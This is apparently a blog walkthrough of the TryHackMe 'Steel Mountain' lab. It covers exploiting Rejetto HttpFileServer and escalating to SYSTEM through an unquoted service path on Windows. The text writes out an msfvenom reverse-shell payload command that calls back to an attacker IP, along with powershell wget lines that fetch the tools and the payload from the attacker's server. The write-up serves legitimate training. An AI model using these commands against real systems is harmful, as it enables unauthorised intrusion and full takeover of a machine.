---
layout: post
title : TryHackMe Steel Moutain
author: Edwards
date: 2020-10-13
categories : [CTF, TryHackMe]
tags: [Web, Windows, PowerUp]
math: true
---

# Steel Mountain

In this box you will learn : 
- Get infos from a web page.
- Use metasploit to get into a machine.
- Use PowerUp and winPEAS to discover vunerability inside a windows system.
- Upload file with meterpreter inside a machine.
- Take advantage of Unquoted Service Path.
- Use a exploit without metasploit.
- Use a simple python HTTP server to upload malicious file on a remote machine.

### Section 1 : Recon 

Let's start with nmap
![image](/assets/img/steel/nmap.png)

We can see that a website is running on the machine on port 80.

If you go to the website, you will find an image, inspect it to find the name of the employee of the month.

![image](/assets/img/steel/employee.png)

We have a lot of information. Look's like it's running on Microsoft IIS httpd 8.5.

We have an other website running on the port 8080. It's look like a employee utilitary web page to upload fileto a HttpFileServer.

![image](/assets/img/steel/ftp.png)

### Section 2 : Exploit 

We know that the port 8080 is running on a rejetto http file server. 
I found on Rapid 7 a way to exploit it with metasploit.

![image](/assets/img/steel/rejetto.png)

Let's start metasploit.
```bash 
msfconsole
```

Select the right exploit and set the RHOST with the ip of the machine.

![image](/assets/img/steel/setup.png)
_Don't forget to also set the port to 8080_

Run the exploit and normally you will be in. 

You can load powershell from the meterpreter session and select it with :
```bash
powershell_shell
```
![image](/assets/img/steel/shell.png)


_It's recommended by TryHackMe but I rather use the 'shell' basic command._
We know that we are connected as steelmountain\bill with the whoami command.

![image](/assets/img/steel/whoami.png)

### Section 3 : Poor Bill

I checked first in bill files if the flag was hidden there.
It was in the Desktop directory, pretty easy.
![image](/assets/img/steel/desktop.png)


### Section 4 : Privilege Escalation with PowerUp
Now that we are connected as Bill, maybe we can find a way to escalate our way to root.

Let's go back to meterpreter to upload PowerUp to the machine.

_"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."_

You can download the file here : 
 [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

Upload it on your meterpreter session. 
![image](/assets/img/steel/upload.png)

Then execute this two commands. 
_This will run a series of scans on the target to look for vulnerabilities based on pre-determined signatures_

![image](/assets/img/steel/exec.png)

PowerUp returns that the ServiceName : AdvancedSystemCareService9 is vulnerable on this machine.
Why ? Cause the path to this directory contains space, we are gonna take advantage of what's call Unquoted
Service Path Vulnaribility.
We see on the options that the service is restartable, which mean that we can stop it, upload a malicious file onthe right folder and start it again.

![image](/assets/img/steel/invoke.png)


The exploit is gonna work like this
- We open a netcat listener on the port 5555. 
- Stop the Service AdvancedSystemCareService9.
- Upload the file Advanced.exe created with msfvenom on the IObit directory.
- Start the Service again.
- The machine will execute Advanced.exe rather than continuing down the path to open the Advanced SystemCare directory. 
- A session will start on our netcat listener and we will be connected as nt authority system.

First : create the Advanced.exe with msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.15.91 LPORT=5555 -f exe -o Advanced.exe
```
![image](/assets/img/steel/msfvenom.png)
_the lport that you configure is going the same for your netcat listener_

In your meterpreter session stop the AdvancedSystemCareService9.

![image](/assets/img/steel/scstop.png)

Navigate to the IObit folder and upload the Advanced.exe. 

![image](/assets/img/steel/iobit.png)
![image](/assets/img/steel/upload_advanced.png)

On an other terminal, start a netcat listener on the port 5555.

![image](/assets/img/steel/nc.png)

Then on your meterpreter session, start again the AdvancedSystemCareService9.

![image](/assets/img/steel/scstart.png)

Normally on your terminal where netcat is running you will see that you are connected to machine and that you are nt \ authority system

![image](/assets/img/steel/ncsuccess.png)

![image](/assets/img/steel/nt0.png)

You have to navigate to the Desktop of the administrator to find the root.txt

![image](/assets/img/steel/root.png)


### Section 5 : Access without Metasploit.

I really enjoyed this part, since it was the first time I did not use metasploit to get access to a machine.
For this exploit to work you will need : 
- A netcat listener.
- A simple Python HTTP running on port 80 to upload file to the target machine from yours. 
- The exploit file from exploit-db.

First, you need to download the exploit here :
 [!rejetto](https://www.exploit-db.com/exploits/39161)

Set the ip_addr and local_port variable right inside the file.

![image](/assets/img/steel/python.png)


_local_port is gonna be the the same number for the netcat listener_ 

Copy the nc.exe for your python web server in your working directory.
Mine was located on /usr/share/windows-binaries

![image](/assets/img/steel/share.png)

Set up a netcat listener on a new terminal.

![image](/assets/img/steel/nc1.png)

Launch a python webserver so you will be able to share the file on the windows machine when you will be in. 

![image](/assets/img/steel/pythonweb.png)

We are all set, let's launch the python exploit (two times)!
- First time is for putting the netcat binary to the system.
- The second to execute our payload and gain a callback.

The syntaxe is : 
```bash
python exploit.py <target_ip> <target_port>
```

![image](/assets/img/steel/exploitpython.png)

- As you can see I launched the exploit two times 

We have now a session in the terminal where I was listening with netcat.

![image](/assets/img/steel/opensession.png)

We are gonna upload our winPEAS file to search for any flaw in the system.
You can download it on github : 
[!github](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases)

Use the following command to upload it on the target machine :
```bash 
powershell -c wget "http://10.11.15.91/winPEASx86.exe -outfile "winPEAS.exe"
```

I successfully uploaded the .exe on the machine

![image](/assets/img/steel/winpeas.png)

Now run it and don't be afraid by the tons of infos that you will receive ;) 

We see again that the program return us the same problem.
We also know that as the user bill we can write data and create files. 
![image](/assets/img/steel/return.png)

We will do the same as before, upload our Advanced.exe file and listen on a other netcat port.

Again, let's download the msfvenom payload.

![image](/assets/img/steel/msfvenom1.png)

Navigate to the IObit folder :

![image](/assets/img/steel/cdiobit.png)

Upload the Advanced.exe on your target machine with the help of your python server :
```bash 
powershell -c wget "http://10.11.15.91/Advanced.exe -outfile Advanced.exe
```

Set up an other netcat listener to the same port configured on your Advanced payload.

![image](/assets/img/steel/nc2.png)

Then finally stop and start again the AdvancedSystemService9 to execute the payload. 

![image](/assets/img/steel/scstart1.png)

Normally on your netcat listener, you will have a session open and you will be nt autority\system !

![image](/assets/img/steel/nt.png)

This box was very cool, I learned a lot, from privesc to use an exploit without metasploit.


### Section finale : Ressources

Explanation for Unquoted service path :

[link_medium](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)
